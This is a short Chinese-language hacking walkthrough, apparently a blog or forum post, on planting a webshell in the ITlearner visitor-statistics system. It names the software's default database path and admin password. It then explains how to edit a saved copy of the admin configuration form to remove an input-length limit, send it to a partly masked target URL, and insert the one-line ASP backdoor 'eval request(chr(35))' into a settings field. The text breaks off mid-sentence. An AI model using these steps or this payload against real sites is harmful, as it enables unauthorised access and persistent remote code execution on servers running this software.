统计系统使用的是IT学习者的统计系统，在网上下载了一套回来研究。这样的系统拿webshell一般就二种：1.数据库插一句话木马，客户端连接得到。2.网站配置页面写入木马代码拿webshell。打开数据库目录，发现数据库扩展名是asp的，默认路径:data/#ITlearner.asp,把数据库扩展名改成*.mdb，用明小子的数据库工具打开，发现有防下载的表。管理员的默认密码是：ITlearner。数据库插一句话木马这条路是走不通了，现在只有看第二种方法看行不。输入默认密码进入 http://www.cnc-XX.com/admin/cutecounter /admin.asp?action=ShowConfig,查看原代码： 
查找 修改maxlength="3"为maxlength="100">这里是为了突破固定长度的字符输入。然后查找 处 修改为action="http://www.cnc-XX.com/admin/cutecounter/admin?Action=SaveConfig">， 
　　存为html文件打开后在最后详细来访信息记录多少条记录，默认为100条框输入100:eval request(chr(35))，点击保存。提示无法找到，结果发现。